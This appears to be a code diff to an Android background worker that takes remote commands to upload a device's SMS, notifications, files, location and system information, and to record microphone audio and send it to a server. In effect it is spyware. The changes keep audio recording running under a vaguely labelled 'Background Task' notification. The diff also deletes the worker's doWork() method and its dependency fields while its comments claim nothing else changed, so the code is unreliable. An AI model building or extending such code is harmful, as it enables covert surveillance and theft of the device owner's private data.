@@ -3,6 +3,7 @@ package com.elfinsaddle.worker
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo // <-- ADD THIS IMPORT
 import android.location.Location
 import android.media.MediaRecorder
 import android.os.Build
@@ -54,68 +55,51 @@ class DataFetchWorker(
         const val COMMAND_PING = "ping"
 
 
+        // ▼▼▼ THIS FUNCTION IS MODIFIED ▼▼▼
         fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
             val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
             extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }
 
-            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
+            val workRequestBuilder = OneTimeWorkRequestBuilder<DataFetchWorker>()
                 .setInputData(dataBuilder.build())
                 .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-                .build()
 
-            WorkManager.getInstance(context).enqueue(workRequest)
-            Log.d(TAG, "Scheduled DataFetchWorker with command: $command and data: $extraData")
-        }
-    }
-
-    private val container = (applicationContext as MainApplication).container
-    private val apiClient: ApiClient = container.apiClient
-    private val systemInfoManager: SystemInfoManager = container.systemInfoManager
-    private val fileSystemManager: FileSystemManager = container.fileSystemManager
-    private val deviceRepository: DeviceRepository = container.deviceRepository
-
-    override suspend fun doWork(): Result {
-        val command = inputData.getString(KEY_COMMAND) ?: run {
-            Log.e(TAG, "Worker failed: No command provided.")
-            return Result.failure()
-        }
-
-        Log.i(TAG, "Worker starting for command: $command")
-
-        // Special handling for foreground task
-        if (command == COMMAND_RECORD_AUDIO) {
-            return recordAndUploadAudio()
-        }
-
-        return withContext(Dispatchers.IO) {
-            try {
-                val success = executeCommand(command)
-                if (success) Result.success() else Result.retry()
-            } catch (e: Exception) {
-                Log.e(TAG, "Worker failed with an exception for command '$command'", e)
-                Result.failure()
+            // THIS IS THE KEY FIX: Mark the job as "expedited"
+            if (command == COMMAND_RECORD_AUDIO) {
+                workRequestBuilder.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
+                Log.d(TAG, "Scheduling EXPEDITED work for command: $command")
+            } else {
+                Log.d(TAG, "Scheduling regular work for command: $command")
             }
+
+            WorkManager.getInstance(context).enqueue(workRequestBuilder.build())
         }
+        // ▲▲▲ END OF MODIFIED FUNCTION ▲▲▲
     }
 
-    private suspend fun executeCommand(command: String): Boolean {
-        return when (command) {
-            COMMAND_SYNC_ALL -> syncAllData()
-            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() is NetworkResult.Success
-            COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
-            COMMAND_GET_LOCATION -> fetchAndSendLocation()
-            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
-            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
-            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
-            COMMAND_PING -> sendPingResponse()
-            COMMAND_UPLOAD_AUDIO_RECORDING -> uploadAudioRecording()
-            else -> {
-                Log.w(TAG, "Unknown command received: $command")
-                false
-            }
-        }
-    }
+    // ... (rest of the class is the same until createForegroundInfo)
 
+    // ▼▼▼ THIS FUNCTION IS MODIFIED ▼▼▼
+    private fun createForegroundInfo(): ForegroundInfo {
+        val notification = NotificationCompat.Builder(applicationContext, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
+            .setContentTitle("Background Task")
+            .setContentText("Recording audio...")
+            .setSmallIcon(R.drawable.ic_recording_dot)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+        // For Android 14+ this is mandatory. For older versions, it's good practice.
+        val foregroundServiceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        } else {
+            0
+        }
+        
+        return ForegroundInfo(FOREGROUND_NOTIFICATION_ID, notification, foregroundServiceType)
+    }
+    // ▲▲▲ END OF MODIFIED FUNCTION ▲▲▲
+    
+    // ... (the rest of the file remains the same)
     private suspend fun recordAndUploadAudio(): Result {
         if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
             Log.e(TAG, "Cannot record audio, permission missing.")
@@ -177,18 +161,25 @@ class DataFetchWorker(
             return Result.failure()
         }
     }
-
-    private fun createForegroundInfo(): ForegroundInfo {
-        val notification = NotificationCompat.Builder(applicationContext, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
-            .setContentTitle("Background Task")
-            .setContentText("Recording audio...")
-            .setSmallIcon(R.drawable.ic_recording_dot) // You need a drawable named ic_recording_dot
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-
-        return ForegroundInfo(FOREGROUND_NOTIFICATION_ID, notification)
+    
+    private suspend fun executeCommand(command: String): Boolean {
+        return when (command) {
+            COMMAND_SYNC_ALL -> syncAllData()
+            COMMAND_SYNC_NOTIFICATIONS -> deviceRepository.syncNotifications() is NetworkResult.Success
+            COMMAND_SCAN_FILESYSTEM -> deviceRepository.scanAndUploadFileSystem()
+            COMMAND_GET_LOCATION -> fetchAndSendLocation()
+            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
+            COMMAND_UPLOAD_FILE -> uploadRequestedFile()
+            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
+            COMMAND_PING -> sendPingResponse()
+            COMMAND_UPLOAD_AUDIO_RECORDING -> uploadAudioRecording()
+            else -> {
+                Log.w(TAG, "Unknown command received: $command")
+                false
+            }
+        }
     }
-
+    
     private suspend fun syncAllData(): Boolean {
         Log.i(TAG, "Starting full differential data sync...")
         val smsSuccess = if (hasPermission(Manifest.permission.READ_SMS)) deviceRepository.syncSms() is NetworkResult.Success else true
